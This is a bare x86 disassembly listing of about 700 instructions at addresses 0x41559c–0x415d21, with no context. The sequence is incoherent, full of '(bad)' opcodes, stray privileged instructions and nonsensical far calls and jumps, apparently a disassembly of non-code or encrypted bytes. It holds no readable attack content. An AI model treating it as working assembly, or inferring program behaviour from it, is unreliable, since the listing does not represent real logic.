  41559c:	pop    ds
  41559d:	push   ds
  41559e:	lahf   
  41559f:	adc    DWORD PTR [eax],ebx
  4155a1:	pop    ebp
  4155a2:	xchg   edx,eax
  4155a3:	js     0x4155a0
  4155a5:	int3   
  4155a6:	mov    al,BYTE PTR [bp+di-0x2e]
  4155aa:	ret    
  4155ab:	cli    
  4155ac:	test   BYTE PTR [edx],ah
  4155ae:	jb     0x4155e8
  4155b0:	xchg   ecx,eax
  4155b1:	cmp    al,0x7e
  4155b3:	pushf  
  4155b4:	mov    ecx,0x6b23924c
  4155b9:	popf   
  4155ba:	inc    ebp
  4155bb:	call   0xc5ec04d6
  4155c0:	pop    esi
  4155c1:	push   edi
  4155c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c3:	test   al,0xcc
  4155c5:	es mov ebp,0x3c5071aa
  4155cb:	xchg   ebp,eax
  4155cc:	xchg   edi,eax
  4155cd:	push   ecx
  4155ce:	outs   dx,BYTE PTR ds:[esi]
  4155cf:	fisttp WORD PTR [ebx+0x4f7a80b]
  4155d5:	int    0x7
  4155d7:	or     al,0x1d
  4155d9:	jne    0x415619
  4155db:	ret    
  4155dc:	xrelease xchg DWORD PTR ds:0x2f227b82,eax
  4155e3:	sbb    al,0x5f
  4155e5:	mov    ds:0xa8908f0c,eax
  4155ea:	sub    ebp,DWORD PTR [edi-0x6c4b9a21]
  4155f0:	gs xor al,0x79
  4155f3:	rcl    BYTE PTR [ebx-0x2a2e94bf],0x2c
  4155fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155fb:	sub    al,0x2d
  4155fd:	sbb    ebp,ebp
  4155ff:	ja     0x4155a8
  415601:	xchg   edi,eax
  415602:	fcom   QWORD PTR ds:0xa1d359df
  415608:	or     ebx,DWORD PTR [ebp-0xf9fb0ac]
  41560e:	(bad)  
  41560f:	(bad)  
  415610:	fcomp  DWORD PTR [edx]
  415612:	adc    DWORD PTR [edi*4-0x3723d92],esp
  415619:	add    edx,esp
  41561b:	adc    al,0x8a
  41561d:	(bad)  
  41561e:	cli    
  41561f:	in     al,0xc5
  415621:	adc    BYTE PTR [esi-0x37],0xe6
  415625:	maxps  xmm5,XMMWORD PTR [eax+0x2fff2ff2]
  41562c:	lea    ebx,[ebp-0x65]
  41562f:	icebp  
  415630:	int3   
  415631:	mov    ebx,0x25ffe28d
  415636:	or     dh,BYTE PTR [edx+0x828ea40]
  41563c:	test   edx,esi
  41563e:	sbb    eax,0x27dbab36
  415643:	mov    WORD PTR [ebx],ds
  415645:	add    ebx,ebx
  415647:	lahf   
  415648:	test   DWORD PTR [ecx-0x18a50e97],0x7358a16a
  415652:	fcmovnbe st,st(7)
  415654:	cld    
  415655:	addr16 div ch
  415658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415659:	ins    BYTE PTR es:[edi],dx
  41565a:	outs   dx,DWORD PTR ds:[esi]
  41565b:	call   DWORD PTR [ebp-0x66]
  41565e:	into   
  41565f:	add    al,0xc1
  415661:	shl    BYTE PTR [esp+ebx*2+0x46],1
  415665:	sahf   
  415666:	scas   al,BYTE PTR es:[edi]
  415667:	aam    0x0
  415669:	pop    esi
  41566a:	test   ecx,edx
  41566c:	aaa    
  41566d:	or     bh,BYTE PTR [ecx-0x64]
  415670:	test   al,0x22
  415672:	aas    
  415673:	sbb    eax,0xa348a07
  415678:	jg     0x4155fe
  41567a:	jae    0x415686
  41567c:	inc    ecx
  41567d:	call   0x1bae:0x43e181c7
  415684:	imul   ebx,DWORD PTR [edx-0x6b422079],0xf71e4587
  41568e:	dec    ebx
  41568f:	outs   dx,DWORD PTR ds:[esi]
  415690:	mov    cl,0xa4
  415692:	jecxz  0x415658
  415694:	retf   0x5330
  415697:	mov    edx,0x61ed3263
  41569c:	pshufw mm0,QWORD PTR [edi-0x6cf974c8],0xb8
  4156a4:	icebp  
  4156a5:	cdq    
  4156a6:	jb     0x41569d
  4156a8:	mov    ebx,0x7ab06d02
  4156ad:	mov    cl,BYTE PTR [ecx-0x4e]
  4156b0:	rcr    BYTE PTR [edx+0x57ce279],cl
  4156b6:	daa    
  4156b7:	cmp    DWORD PTR [esp+ebx*4],edi
  4156ba:	push   esp
  4156bb:	add    al,0x3b
  4156bd:	pop    ds
  4156be:	pop    ebp
  4156bf:	sub    al,BYTE PTR [edi+0x6]
  4156c2:	outs   dx,BYTE PTR ds:[esi]
  4156c3:	jns    0x415676
  4156c5:	pop    ss
  4156c6:	push   edi
  4156c7:	mov    bl,0xfe
  4156c9:	xor    BYTE PTR [edx],bl
  4156cb:	fdivr  st,st(0)
  4156cd:	cli    
  4156ce:	ror    ch,1
  4156d0:	loop   0x415748
  4156d2:	lock (bad) 
  4156d4:	and    bl,BYTE PTR [eax+0x6a]
  4156d7:	xchg   ebx,eax
  4156d8:	lea    eax,[esi]
  4156da:	pop    esp
  4156db:	xchg   BYTE PTR [ebx+edi*8+0xae7b5ea],dl
  4156e2:	lods   eax,DWORD PTR ds:[esi]
  4156e3:	sahf   
  4156e4:	mov    ds:0xab8ff34c,al
  4156e9:	rcr    ah,1
  4156eb:	jmp    0x415748
  4156ed:	ret    0x90b7
  4156f0:	push   ss
  4156f1:	mov    cl,0x27
  4156f3:	retf   0x2fd2
  4156f6:	in     al,0xd2
  4156f8:	or     dh,BYTE PTR [ebx+0x738438e2]
  4156fe:	sar    BYTE PTR [edi-0x7f],1
  415701:	(bad)  
  415702:	xchg   esp,eax
  415703:	push   ecx
  415704:	fst    DWORD PTR [ebp+0x4b]
  415707:	mov    al,0x72
  415709:	xor    DWORD PTR [eax+0x41090dce],ebp
  41570f:	xor    DWORD PTR [ecx],ebx
  415711:	rcr    BYTE PTR [eax],cl
  415713:	ret    0x8193
  415716:	adc    DWORD PTR [edi],0x5
  415719:	mov    ah,0xbd
  41571b:	hlt    
  41571c:	mov    bh,dh
  41571e:	push   ebp
  41571f:	adc    DWORD PTR [ecx-0x6f],esp
  415722:	stos   BYTE PTR es:[edi],al
  415723:	int    0x97
  415725:	xor    DWORD PTR [esi+0x39f03e5d],0x62
  41572c:	fs addr16 push esi
  41572f:	sbb    bh,BYTE PTR [eax-0xfc840b4]
  415735:	xchg   edi,eax
  415736:	inc    esp
  415737:	cli    
  415738:	mov    dl,0xbd
  41573a:	mov    esi,DWORD PTR ds:0xbdfb443c
  415740:	test   BYTE PTR [eax],0x5e
  415743:	popf   
  415744:	adc    al,dl
  415746:	add    bl,BYTE PTR [esi+0x653ae7ac]
  41574c:	xor    DWORD PTR [eax],ebp
  41574e:	mov    dh,0x66
  415750:	or     eax,0x62a512d8
  415755:	loopne 0x41573e
  415757:	cmc    
  415758:	fidiv  WORD PTR [esi+0x7e]
  41575b:	aas    
  41575c:	cmp    DWORD PTR [edx],ebx
  41575e:	cli    
  41575f:	popa   
  415760:	or     cl,BYTE PTR [ebp+0x7c]
  415763:	cmp    eax,0xb95edbea
  415768:	sar    dl,cl
  41576a:	loopne 0x415771
  41576c:	iret   
  41576d:	cs lahf 
  41576f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415770:	call   0x4ece:0xf855c43f
  415777:	mov    ?,WORD PTR ds:0xedfa
  41577c:	scas   al,BYTE PTR es:[edi]
  41577d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41577e:	arpl   WORD PTR [edi],di
  415780:	fcmovbe st,st(4)
  415782:	xor    al,0x71
  415784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415785:	scas   eax,DWORD PTR es:[edi]
  415786:	dec    edx
  415787:	mov    al,0x9
  415789:	(bad)  
  41578a:	scas   al,BYTE PTR es:[edi]
  41578b:	in     al,dx
  41578c:	jmp    0x41571e
  41578e:	sub    edx,DWORD PTR [ebp+0x41]
  415791:	push   esp
  415792:	sahf   
  415793:	lds    esp,FWORD PTR [ecx-0x6ad70efb]
  415799:	and    dh,BYTE PTR [eax+0x31]
  41579c:	mov    esp,ss
  41579e:	cmp    BYTE PTR [eax],ch
  4157a0:	adc    BYTE PTR [edi+ecx*1],dl
  4157a3:	sbb    DWORD PTR [esi+0x1b7fb078],edx
  4157a9:	pushf  
  4157aa:	inc    esi
  4157ab:	and    al,0xc0
  4157ad:	mov    ch,0x30
  4157af:	push   0x76
  4157b1:	fwait
  4157b2:	in     eax,dx
  4157b3:	pop    eax
  4157b4:	inc    eax
  4157b5:	sbb    BYTE PTR [ebp+0x77],cl
  4157b8:	xchg   edx,eax
  4157b9:	shr    DWORD PTR [esi],cl
  4157bb:	mov    esp,0x4c4c6c14
  4157c0:	adc    eax,0x3a294dfb
  4157c5:	and    edx,DWORD PTR [edi-0x5112d798]
  4157cb:	push   esp
  4157cc:	ss scas al,BYTE PTR es:[edi]
  4157ce:	icebp  
  4157cf:	mov    ch,0x21
  4157d1:	mov    bl,dh
  4157d3:	imul   BYTE PTR [esi+edi*1-0x42]
  4157d7:	aas    
  4157d8:	sub    BYTE PTR [ecx+edi*4-0x58],al
  4157dc:	mov    ebx,0x91e5b067
  4157e1:	add    dl,al
  4157e3:	or     BYTE PTR [edi+0x60],dh
  4157e6:	sub    DWORD PTR [edi+ebp*8-0x49332d09],esp
  4157ed:	pop    ds
  4157ee:	(bad)  
  4157ef:	xlat   BYTE PTR ds:[ebx]
  4157f0:	fs inc ecx
  4157f2:	jo     0x4157ad
  4157f4:	cwde   
  4157f5:	and    esp,DWORD PTR [ecx]
  4157f7:	neg    eax
  4157f9:	inc    ecx
  4157fa:	jle    0x415870
  4157fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157fd:	out    0x8a,al
  4157ff:	mov    fs,WORD PTR [ebx+0x1a]
  415802:	(bad)  
  415803:	fwait
  415804:	loope  0x415880
  415806:	js     0x4157b3
  415808:	pop    eax
  415809:	and    al,0xc1
  41580b:	dec    ebp
  41580c:	jge    0x415821
  41580e:	outs   dx,DWORD PTR ds:[esi]
  41580f:	stc    
  415810:	ja     0x4157f4
  415812:	les    ebx,FWORD PTR [eax-0x586070ad]
  415818:	aas    
  415819:	mov    edi,0x6193130d
  41581e:	jecxz  0x41588c
  415820:	inc    ecx
  415821:	into   
  415822:	fnstsw WORD PTR [ecx-0x1c]
  415825:	mov    ebx,0xd9555bd3
  41582a:	jge    0x415821
  41582c:	fstp   QWORD PTR [edx-0x62490a02]
  415832:	xchg   edx,eax
  415833:	mov    ds:0xabb2efc0,al
  415838:	aas    
  415839:	pushf  
  41583a:	mov    ah,BYTE PTR [esi+0x73]
  41583d:	retf   0x8508
  415840:	cs js  0x415892
  415843:	mov    ebp,0x321383ef
  415848:	aas    
  415849:	mov    bh,0x30
  41584b:	(bad)
  415850:	mov    bl,0xc6
  415852:	ins    BYTE PTR es:[edi],dx
  415853:	dec    ebp
  415854:	loope  0x4158d1
  415856:	mov    ah,0x21
  415858:	mov    cl,0xbc
  41585a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41585b:	adc    dl,BYTE PTR [eax+0x350425ba]
  415861:	cmp    esi,eax
  415863:	mov    edi,0x70fceffb
  415868:	in     al,0xba
  41586a:	fist   DWORD PTR [eax+0x8]
  41586d:	fsub   st(0),st
  41586f:	sub    BYTE PTR [esi+0x59],al
  415872:	outs   dx,DWORD PTR ds:[si]
  415874:	loope  0x4158b9
  415876:	xchg   edi,eax
  415877:	js     0x4158f3
  415879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41587a:	mov    ebp,0x68f322cb
  41587f:	iret   
  415880:	inc    edx
  415881:	std    
  415882:	inc    edx
  415883:	and    dh,dl
  415885:	mov    al,ds:0x8b4ac35d
  41588a:	data16 sub BYTE PTR [ecx+0x1e85bb0f],0x20
  415892:	push   ebp
  415893:	adc    bh,BYTE PTR [edx-0x5556ab57]
  415899:	ins    BYTE PTR es:[edi],dx
  41589a:	sbb    DWORD PTR [ebp+ebp*2-0x22],ebx
  41589e:	and    ch,BYTE PTR [eax+ecx*1-0x5b518b3d]
  4158a5:	mov    eax,0xa64df477
  4158aa:	(bad)  
  4158ab:	jno    0x4158cc
  4158ad:	mov    ah,0x5
  4158af:	jle    0x4158c4
  4158b1:	(bad)
  4158b4:	push   ss
  4158b5:	rcl    DWORD PTR [edx+0x5b253c85],1
  4158bb:	sti    
  4158bc:	inc    esi
  4158bd:	nop
  4158be:	adc    eax,0x99025501
  4158c3:	push   edx
  4158c4:	mov    dl,0xf5
  4158c6:	push   cs
  4158c7:	inc    ebp
  4158c8:	and    al,0x8
  4158ca:	mov    BYTE PTR [eax-0x6c],ah
  4158cd:	jle    0x415925
  4158cf:	cmp    BYTE PTR [edi+0x7c22e0ce],cl
  4158d5:	mov    cl,BYTE PTR [edi+0x2b3a4776]
  4158db:	ror    BYTE PTR [eax+0x2a],1
  4158de:	pop    ecx
  4158df:	ja     0x415926
  4158e1:	test   al,0xc5
  4158e3:	and    DWORD PTR [ebp-0x73000f2c],ebx
  4158e9:	into   
  4158ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158eb:	test   al,0xc
  4158ed:	adc    esp,DWORD PTR [edx]
  4158ef:	xchg   esi,ebp
  4158f1:	mov    ebx,0x51ed4f26
  4158f6:	clc    
  4158f7:	(bad)  
  4158f8:	fstp   TBYTE PTR [esi+edi*8-0x51]
  4158fc:	adc    dh,BYTE PTR [ebp+0xc]
  4158ff:	pop    ebx
  415900:	hlt    
  415901:	adc    ch,BYTE PTR [ebx]
  415903:	daa    
  415904:	mov    WORD PTR [ebx+esi*4-0x7b],ds
  415908:	fild   DWORD PTR [eax]
  41590a:	popa   
  41590b:	into   
  41590c:	call   0x39a2914b
  415911:	sub    eax,0x3119be75
  415916:	mov    edi,0x8366731c
  41591b:	ds pop ss
  41591d:	outs   dx,BYTE PTR ds:[esi]
  41591e:	mov    bh,0x9
  415920:	xchg   eax,ebp
  415922:	ret    0xb065
  415925:	je     0x415903
  415927:	jb     0x4158b0
  415929:	sub    al,cl
  41592b:	xchg   ebx,eax
  41592c:	je     0x415917
  41592e:	fdivr  DWORD PTR [ecx+0x1640ac90]
  415934:	repz jo 0x4158ed
  415937:	mov    esi,0xe5529618
  41593c:	mov    ds:0xb6dac6f9,eax
  415941:	pop    es
  415942:	and    al,0x77
  415944:	ins    BYTE PTR es:[edi],dx
  415945:	xor    edx,DWORD PTR [esi-0x44]
  415948:	(bad)  
  415949:	outs   dx,BYTE PTR ds:[esi]
  41594a:	pop    ebp
  41594b:	int    0x6a
  41594d:	sub    DWORD PTR [ecx+edi*1],edi
  415950:	les    ebx,FWORD PTR [eax-0x80]
  415953:	jecxz  0x4159c4
  415955:	outs   dx,DWORD PTR ds:[esi]
  415956:	add    ebx,DWORD PTR [ecx+0x48e95e82]
  41595c:	cmp    bh,BYTE PTR [edx-0x26d756e4]
  415962:	xchg   BYTE PTR ds:[eax-0x65],ah
  415966:	ds out dx,al
  415968:	mov    ebx,0xb38f9d41
  41596d:	push   es
  41596e:	xchg   DWORD PTR [esi],esp
  415970:	sub    eax,0xf4dc7477
  415975:	jp     0x4159d1
  415977:	(bad)
  41597a:	repz test eax,0x137cab2
  415980:	xor    ebx,DWORD PTR [ebx]
  415982:	pop    ebp
  415983:	dec    ebp
  415984:	mov    ds:0xa4b13309,al
  415989:	adc    dh,ah
  41598b:	sub    bl,bl
  41598d:	sar    BYTE PTR [eax+ebp*1+0x610139db],cl
  415994:	jg     0x4159ca
  415996:	std    
  415997:	adc    al,0xc8
  415999:	jp     0x415967
  41599b:	jg     0x4159b3
  41599d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41599e:	xchg   edi,eax
  41599f:	call   0x3220:0xe296a97c
  4159a6:	loopne 0x415990
  4159a8:	sub    BYTE PTR ds:0x77955c7e,0x5a
  4159af:	dec    edx
  4159b0:	xchg   BYTE PTR [eax+0x2d2658f7],ch
  4159b6:	dec    esi
  4159b7:	adc    BYTE PTR [edi+0x3b],dh
  4159ba:	loop   0x41597c
  4159bc:	dec    ebx
  4159bd:	shl    BYTE PTR [eax],0xd7
  4159c0:	mov    WORD PTR [eax+eax*2-0x5b],cs
  4159c4:	aad    0xee
  4159c6:	mov    edi,0x3e8a0bb1
  4159cb:	inc    esp
  4159cc:	and    DWORD PTR [eax],esi
  4159ce:	cmp    DWORD PTR [ebp-0xb],eax
  4159d1:	mul    edx
  4159d3:	dec    edx
  4159d4:	ret    
  4159d5:	push   edx
  4159d6:	xchg   esp,eax
  4159d7:	jnp    0x415a3e
  4159d9:	addr16 fs enter 0xdb5,0x5e
  4159df:	pop    edx
  4159e0:	dec    ecx
  4159e1:	ret    0x805e
  4159e4:	cli    
  4159e5:	adc    eax,0x180c860f
  4159ea:	repz add BYTE PTR [ecx],bh
  4159ed:	nop
  4159ee:	repnz pop esp
  4159f0:	mov    edi,0xc79e7b44
  4159f5:	test   BYTE PTR [ebx+0x38],0x58
  4159f9:	test   DWORD PTR [ebx+0x30],edi
  4159fc:	add    ebp,DWORD PTR [eax-0xaa64c2]
  415a02:	adc    ebp,DWORD PTR [edx+0x5fa45751]
  415a08:	push   edi
  415a09:	ja     0x415a4b
  415a0b:	xor    DWORD PTR [edx-0x2c],eax
  415a0e:	ins    DWORD PTR es:[edi],dx
  415a0f:	pop    esi
  415a10:	cmp    BYTE PTR [ebx-0x5a],dh
  415a13:	add    al,0x6b
  415a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a16:	cld    
  415a17:	and    bl,BYTE PTR [esi+0x35]
  415a1a:	xchg   edx,eax
  415a1b:	jge    0x4159c6
  415a1d:	enter  0x4639,0x4e
  415a21:	mov    eax,ds:0x511254bf
  415a26:	popf   
  415a27:	(bad)  
  415a28:	inc    DWORD PTR [eax+0x6f430eba]
  415a2e:	xchg   ebx,eax
  415a2f:	jns    0x415a6d
  415a31:	cmp    al,0xba
  415a33:	mov    bl,BYTE PTR ss:[ecx+0x156f77f7]
  415a3a:	dec    edi
  415a3b:	push   0x38fa7b61
  415a40:	push   0x6f2f2798
  415a45:	lods   eax,DWORD PTR ds:[esi]
  415a46:	(bad)  
  415a47:	dec    esp
  415a48:	cmp    DWORD PTR es:[ecx*8-0x29684daf],ecx
  415a50:	mov    ecx,0xa9d828e6
  415a55:	push   esp
  415a56:	ret    0xb248
  415a59:	jnp    0x415abe
  415a5b:	enter  0x9f21,0xc5
  415a5f:	sbb    eax,0x3448ccaf
  415a64:	retf   
  415a65:	adc    bh,BYTE PTR [esi]
  415a67:	sbb    DWORD PTR [edi],edi
  415a69:	test   DWORD PTR [esi+0x59],ebp
  415a6c:	fwait
  415a6d:	pop    ebp
  415a6e:	jo     0x415ac9
  415a70:	sbb    bh,dh
  415a72:	push   eax
  415a73:	test   al,0xf8
  415a75:	icebp  
  415a76:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a78:	sar    DWORD PTR [ebx+edx*1],cl
  415a7b:	cmp    DWORD PTR cs:[ebx],ecx
  415a7e:	push   ecx
  415a7f:	fisubr WORD PTR [esi]
  415a81:	sbb    ch,BYTE PTR [ecx+0x2933243e]
  415a87:	outs   dx,DWORD PTR ds:[esi]
  415a88:	jp     0x415ab4
  415a8a:	xchg   ebp,eax
  415a8b:	aad    0x80
  415a8d:	xchg   esi,eax
  415a8e:	dec    eax
  415a8f:	jo     0x415b04
  415a91:	xchg   edi,eax
  415a92:	(bad)  
  415a93:	or     DWORD PTR [ebx],ecx
  415a95:	mov    DWORD PTR [edx+ebx*4],ebx
  415a98:	add    eax,0x6ab41ccc
  415a9d:	push   edi
  415a9e:	push   es
  415a9f:	pusha  
  415aa0:	cwde   
  415aa1:	or     eax,0x65427d50
  415aa6:	adc    al,0xd4
  415aa8:	jecxz  0x415a8e
  415aaa:	(bad)  
  415aab:	fsubrp st(2),st
  415aad:	pop    edi
  415aae:	jmp    0xd783:0xa3d26d35
  415ab5:	call   0x7c1a:0x7a374d52
  415abc:	iret   
  415abd:	retf   0x3ca7
  415ac0:	pop    edx
  415ac1:	mov    ch,BYTE PTR [ecx+ebp*8+0xf180d27]
  415ac8:	adc    edi,DWORD PTR [eax+edx*2-0x510ed64a]
  415acf:	stos   BYTE PTR es:[edi],al
  415ad0:	mov    dh,0x6a
  415ad2:	add    eax,esi
  415ad4:	aaa    
  415ad5:	cmp    eax,DWORD PTR [ebp-0x22]
  415ad8:	mov    ebp,0xff42e186
  415add:	add    al,0x47
  415adf:	pusha  
  415ae0:	cmp    DWORD PTR [ebp-0x5f],0x0
  415ae4:	jne    0x415a7e
  415ae6:	cmp    al,0xb9
  415ae8:	xchg   DWORD PTR [eax+eax*1-0x62],ebp
  415aec:	jmp    0xe0010208
  415af1:	jle    0x415b34
  415af3:	mov    al,0x8f
  415af5:	cmp    al,0x34
  415af7:	sbb    DWORD PTR ds:0x9293b3fe,0x4d
  415afe:	jg     0x415b2c
  415b00:	dec    ebp
  415b01:	and    esp,DWORD PTR [esi-0xf040e07]
  415b07:	retf   0xbe95
  415b0a:	fcmovnu st,st(1)
  415b0c:	inc    edx
  415b0d:	stos   BYTE PTR es:[edi],al
  415b0e:	xchg   ecx,eax
  415b0f:	in     eax,0xd7
  415b11:	xchg   edx,eax
  415b12:	arpl   WORD PTR [esi+0x70],si
  415b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b16:	test   al,0xf3
  415b18:	fwait
  415b19:	and    esi,edx
  415b1b:	pusha  
  415b1c:	fist   WORD PTR [eax]
  415b1e:	push   esp
  415b1f:	outs   dx,DWORD PTR ds:[esi]
  415b20:	jbe    0x415aeb
  415b22:	je     0x415b22
  415b24:	xor    BYTE PTR [edi+0x37],al
  415b27:	loopne 0x415abd
  415b29:	scas   al,BYTE PTR es:[edi]
  415b2a:	cmp    BYTE PTR [edx-0x76e22868],0x61
  415b31:	add    al,bl
  415b33:	jmp    0x415ac3
  415b35:	adc    eax,0x2905a16
  415b3a:	test   al,dh
  415b3c:	dec    eax
  415b3d:	test   DWORD PTR ds:0x465f3f04,edx
  415b43:	out    0x48,al
  415b45:	sahf   
  415b46:	loop   0x415b99
  415b48:	inc    esp
  415b49:	cli    
  415b4a:	std    
  415b4b:	jmp    0x8e001306
  415b50:	xchg   ebp,eax
  415b51:	push   ebp
  415b52:	popf   
  415b53:	aam    0x93
  415b55:	mov    cl,0x80
  415b57:	adc    al,0x27
  415b59:	sub    dl,BYTE PTR [esi+eiz*4]
  415b5c:	ja     0x415aed
  415b5e:	adc    eax,0xaf36b1f9
  415b63:	mov    esp,DWORD PTR [ecx+edi*2]
  415b66:	lahf   
  415b67:	push   esp
  415b68:	sub    BYTE PTR [esi+0x709a6fe6],bh
  415b6e:	inc    eax
  415b6f:	shl    DWORD PTR [esp+edx*2],cl
  415b72:	rcl    bh,1
  415b74:	sbb    bh,bl
  415b76:	pop    eax
  415b77:	stc    
  415b78:	adc    DWORD PTR [esi+edi*4],esi
  415b7b:	mov    cl,0xdf
  415b7d:	lds    edi,FWORD PTR ds:0x2201e2f6
  415b83:	jmp    0x415bb4
  415b85:	xchg   DWORD PTR [edi],esp
  415b87:	or     BYTE PTR [eax-0x2f0543f6],cl
  415b8d:	fwait
  415b8e:	push   edx
  415b8f:	loop   0x415b24
  415b91:	inc    edx
  415b92:	test   DWORD PTR [eax],edx
  415b94:	pushf  
  415b95:	in     eax,0xe7
  415b97:	push   es
  415b98:	add    al,0x63
  415b9a:	rol    BYTE PTR [edx-0x7b],1
  415b9d:	dec    eax
  415b9e:	sahf   
  415b9f:	lahf   
  415ba0:	sub    DWORD PTR [edx],edx
  415ba2:	outs   dx,DWORD PTR ds:[esi]
  415ba3:	adc    DWORD PTR [edx+eiz*1-0x9],ebp
  415ba7:	or     al,0x16
  415ba9:	sbb    eax,0xf4c1e418
  415bae:	xor    al,BYTE PTR [eax-0x1]
  415bb1:	and    eax,0x4975ed1d
  415bb6:	mov    esi,0x6f180a29
  415bbb:	inc    edi
  415bbc:	repnz aad 0x38
  415bbf:	jl     0x415c3f
  415bc1:	in     al,dx
  415bc2:	retf   0x2294
  415bc5:	jno    0x415c0c
  415bc7:	lock jo 0x415ba2
  415bca:	ss or  al,0x11
  415bcd:	sub    al,al
  415bcf:	dec    edx
  415bd0:	(bad)  
  415bd1:	iret   
  415bd2:	fdivr  DWORD PTR [eax-0x7d]
  415bd5:	pop    es
  415bd6:	fisttp QWORD PTR [ebp+0x6daa9842]
  415bdc:	xlat   BYTE PTR ds:[ebx]
  415bdd:	gs jo  0x415c01
  415be0:	inc    edi
  415be1:	jbe    0x415c14
  415be3:	jae    0x415c48
  415be5:	mov    ds:0x9dccfdc6,al
  415bea:	clc    
  415beb:	adc    BYTE PTR [ebx],bl
  415bed:	lea    eax,[ecx-0x2cf5aa2b]
  415bf3:	jge    0x415b9e
  415bf5:	aam    0xc2
  415bf7:	bound  ecx,QWORD PTR [edx+esi*4-0x13]
  415bfb:	mov    bl,0x95
  415bfd:	cwde   
  415bfe:	mov    esp,DWORD PTR [eax-0x768f1808]
  415c04:	pop    ecx
  415c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c06:	adc    eax,0xb85e4e00
  415c0b:	dec    edx
  415c0c:	jae    0x415c1c
  415c0e:	mov    al,0x62
  415c10:	in     eax,dx
  415c11:	outs   dx,BYTE PTR ds:[esi]
  415c12:	pop    edi
  415c13:	jg     0x415bd7
  415c15:	mov    bl,al
  415c17:	jno    0x415c8e
  415c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c1a:	das    
  415c1b:	pop    edi
  415c1c:	dec    edx
  415c1d:	aas    
  415c1e:	fwait
  415c1f:	and    al,0x6a
  415c21:	mov    eax,0x6d3f47d5
  415c26:	or     ah,BYTE PTR [edx+0x22863b27]
  415c2c:	dec    eax
  415c2d:	jne    0x415c02
  415c2f:	mov    es,WORD PTR [edx+ebx*4-0x330b90a2]
  415c36:	test   BYTE PTR [eax-0x67c5eeb3],ch
  415c3c:	loop   0x415cbb
  415c3e:	sti    
  415c3f:	jno    0x415bfb
  415c41:	mov    BYTE PTR [esi],bl
  415c43:	xchg   DWORD PTR [edi+0xd],edi
  415c46:	std    
  415c47:	test   al,0xfb
  415c49:	xor    DWORD PTR [eax],edx
  415c4b:	xchg   edi,eax
  415c4c:	adc    eax,0xc63b02fa
  415c51:	pusha  
  415c52:	arpl   WORD PTR [ecx],dx
  415c54:	sub    eax,0x841eb585
  415c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c5a:	pop    ebx
  415c5b:	fs hlt 
  415c5d:	xlat   BYTE PTR ds:[ebx]
  415c5f:	ret    0xa28b
  415c62:	ds ja  0x415c9f
  415c65:	adc    BYTE PTR [edx+0x6b87cbc3],dh
  415c6b:	fs cmp al,0x79
  415c6e:	pop    esi
  415c6f:	xchg   DWORD PTR [ecx+0x7a864acc],edi
  415c75:	popf   
  415c76:	dec    ecx
  415c77:	push   0x47
  415c79:	jae    0x415c9e
  415c7b:	and    edi,edi
  415c7d:	push   es
  415c7e:	mov    al,ds:0x2a1f331e
  415c83:	fisttp QWORD PTR [ecx+ebp*8-0x60]
  415c87:	jmp    0x8262e662
  415c8c:	iret   
  415c8d:	pop    ebp
  415c8e:	fimul  WORD PTR gs:[ebx+0x6a]
  415c92:	xchg   edi,eax
  415c93:	scas   eax,DWORD PTR es:[edi]
  415c94:	out    dx,al
  415c95:	cmp    eax,0x3f672ac1
  415c9a:	adc    al,0xd6
  415c9c:	ret    0x8a95
  415c9f:	repnz xchg ecx,eax
  415ca1:	jns    0x415cd3
  415ca3:	pop    ebx
  415ca4:	add    edi,0x5709b33b
  415caa:	fcmovnu st,st(7)
  415cac:	push   es
  415cad:	fisub  DWORD PTR [eax-0x38]
  415cb0:	push   0xffffff9e
  415cb2:	gs fwait
  415cb4:	inc    ecx
  415cb5:	rcr    BYTE PTR [esi],cl
  415cb7:	mov    ds:0x8ba393f4,al
  415cbc:	push   0xffffff89
  415cbe:	xor    dl,dh
  415cc0:	stos   DWORD PTR es:[edi],eax
  415cc1:	(bad)  
  415cc2:	dec    BYTE PTR [ecx-0x3e]
  415cc5:	stc    
  415cc6:	scas   al,BYTE PTR es:[edi]
  415cc7:	ss stc 
  415cc9:	jbe    0x415c61
  415ccb:	hlt    
  415ccc:	cmp    BYTE PTR [edx+0x2fc3091f],cl
  415cd2:	outs   dx,BYTE PTR ds:[esi]
  415cd3:	add    eax,0xf61614dd
  415cd8:	or     eax,0xeada3185
  415cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cde:	ficom  WORD PTR [eax-0x51]
  415ce1:	push   esi
  415ce2:	pop    ss
  415ce3:	and    DWORD PTR [ebx-0x1e],0x40
  415ce7:	sub    BYTE PTR [edi],cl
  415ce9:	aas    
  415cea:	imul   ecx,DWORD PTR [esi-0x7],0x49
  415cee:	add    DWORD PTR [ebx-0x4df24d59],edi
  415cf4:	dec    edi
  415cf5:	ficomp DWORD PTR [ebx]
  415cf7:	aad    0xea
  415cf9:	push   ds
  415cfa:	fsubp  st(4),st
  415cfc:	push   eax
  415cfd:	repz fbstp TBYTE PTR [edi]
  415d00:	retf   
  415d01:	sub    bh,BYTE PTR [ecx+0x1a]
  415d04:	dec    esp
  415d05:	dec    ecx
  415d06:	sbb    DWORD PTR [esi-0x209ae2ba],0x3d5a65c5
  415d10:	fld    TBYTE PTR [ebx]
  415d12:	mov    cl,0x87
  415d14:	xchg   ebp,eax
  415d15:	dec    esi
  415d16:	inc    ebx
  415d17:	retf   
  415d18:	push   ss
  415d19:	(bad)  
  415d1a:	sar    ebx,cl
  415d1c:	mov    edx,0x11f76fbf
  415d21:	mov    ch,BYTE PTR [ecx-0x72b4b42c]
